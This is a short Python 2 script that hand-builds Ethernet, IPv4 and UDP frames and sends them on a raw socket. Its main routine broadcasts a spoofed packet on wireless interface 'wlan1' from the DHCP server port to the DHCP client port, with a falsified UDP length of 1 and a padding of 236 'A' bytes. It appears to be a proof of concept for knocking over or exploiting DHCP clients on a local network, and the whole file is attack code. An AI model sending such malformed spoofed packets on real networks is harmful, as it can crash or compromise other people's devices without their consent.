from socket import *
import struct
from binascii import *
import os

ICMP = 0x01
UDP = 0x11
TCP = 0x06

def sendeth(src, dst, eth_type, payload, iface):
    # Validation
    assert(len(src) == len(dst) == 6)
    assert(len(eth_type) == 2)

    # Create and bind socket
    s = socket(AF_PACKET, SOCK_RAW) 
    s.bind((iface, 0))

    print 'ether frame: %s' % hexlify(dst + src + eth_type)

    return s.send(dst + src + eth_type + payload)

def pack(buf):
    return b''.join(map(chr, buf))

def sendipv4(eth_src, eth_dst, eth_type, ip_src, ip_dst, ip_type, payload, iface):
    # Asserts
    assert(len(ip_src) == len(ip_dst) == 4)

    print 'ipv4 payload: %s' % hexlify(payload)
    
    frame = b''

    # Version, IHL, DSCP, ECN
    frame += pack([0x45, 0x00])
  
    # Total Length
    frame += struct.pack('>H', 20 + len(payload))
  
    # Identification
    frame += os.urandom(2)
  
    # Flags and fragment
    frame += pack([0x40, 0x00])
  
    # TTL and Protocol
    frame += pack([0x40, ip_type])
  
    # Checksum
    checksum = 0
    for i in range(0, len(frame), 2):
        chunk = frame[i:i+2]
        chunk_val = struct.unpack('>H', chunk)[0]
        checksum += chunk_val
        checksum = (checksum & 0xffff) + (checksum >> 16)
    checksum = checksum ^ 0xffff
    checksum = struct.pack('>H', checksum)
    frame += checksum

    # Source
    frame += ip_src

    # Destination
    frame += ip_dst

    print 'ipv4 frame: %s' % hexlify(frame)

    # Data
    frame += payload

    sendeth(eth_src, eth_dst, eth_type, frame, iface)

  

# Create a broadcast ethernet frame
eth_src = pack([0xa2, 0x2c, 0x36, 0x63, 0xab, 0x42])
eth_dst = pack([0xff, 0xff, 0xff, 0xff, 0xff, 0xff])
eth_type = pack([0x08, 0x00])

ip_src = pack([192, 168, 100, 1])
ip_dst = pack([255, 255, 255, 255])
ip_type = UDP
iface = 'wlan1'

# UDP
payload = b''
payload += pack([0x00, 67]) # SRC PORT
payload += pack([0x00, 68]) # DST PORT
payload += pack([0x00, 0x01]) # LENGTH (spoofed
payload += pack([0x00, 0x00]) # Checksum (disabled)
payload += 'A'*236

sendipv4(eth_src, eth_dst, eth_type, ip_src, ip_dst, ip_type, payload, iface)
